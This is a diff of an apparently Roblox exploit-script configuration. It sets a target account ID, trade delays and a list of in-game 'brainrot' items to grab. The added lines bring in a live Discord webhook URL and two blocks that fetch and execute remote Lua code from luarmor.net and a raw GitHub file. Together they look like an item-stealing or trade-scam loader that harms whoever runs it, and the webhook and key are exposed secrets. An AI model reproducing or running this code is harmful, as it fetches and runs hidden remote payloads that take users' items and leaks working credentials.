@@ -2,6 +2,7 @@ getgenv().SECRET_KEY = "mrr_5c719cba76b94b549e6f4663931f324a"
 getgenv().TARGET_ID = 9186422155
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484299198655631451/hOLhZmnSnf5ilcUpzbEcC7XKhjOClJUPD5ktk-xcvLuB4PIYbH35GiETbZWAl_reLZS6"
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
@@ -182,4 +183,9 @@ getgenv().TARGET_BRAINROTS = {
     ["Chicleteirina Bicicleteirina"] = true,
     ["To to to Sahur"] = true
 }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/koop232/laced-hub/refs/heads/main/message%20-%202026-03-15T105922.103"))()
+end)
